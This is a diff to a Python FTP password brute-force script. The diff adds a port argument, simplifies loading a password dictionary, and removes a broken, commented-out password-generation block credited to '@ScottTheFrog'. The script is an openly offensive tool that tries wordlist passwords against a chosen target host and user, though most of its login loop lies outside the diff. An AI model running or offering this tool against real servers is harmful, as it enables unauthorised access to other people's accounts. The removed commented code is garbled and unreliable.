@@ -9,19 +9,16 @@ parser = argparse.ArgumentParser(description='Bruteforce for FTP servers using a
 parser.add_argument('-t', '--target', help="Specify a target (host)", required=True)
 parser.add_argument('-u', '--user', help="FTP user", required=True)
 parser.add_argument('-d', '--dict', help="Password dictionary (txt file)", required=True)
+parser.add_argument('-p', '--port', help="Port to use (Optional, default 21)", type=int, default=21)
 args = parser.parse_args()
 
 target = args.target
 user = args.user
+port = args.port
 pwd_dict_route = args.dict
-port = 21 #Default
 
-with open(pwd_dict_route, 'r') as file:
-    pwd_dict = set()
-    for password in file.readlines():
-        pwd_dict.add(password)
-
-    file.close()
+# - Set password list to use - #
+pwd_dict = set(open(pwd_dict_route).read().splitlines())
 
 def bruteforce(target, user, pwd_dict):
     server = ftplib.FTP()
@@ -40,20 +37,3 @@ def bruteforce(target, user, pwd_dict):
             break
 
 bruteforce(target, user, pwd_dict)
-
-
-# - New password_dict creation algorithm by @ScottTheFrog - #
-#passwordlist = []
-#passwordnew = ""
-#range = 0
-#for i in password
-#    passwordlist.append(i)
-#    server.login(user, i)
-
-#range = range(0,len(passwordlist))
-#for i in range
-#    passwordnew = ""
-#    for e in passworlist
-#        passwordnew += passwordlist[e]
-#        server.login(user, e)
-#        server.login(user, passwordnew)
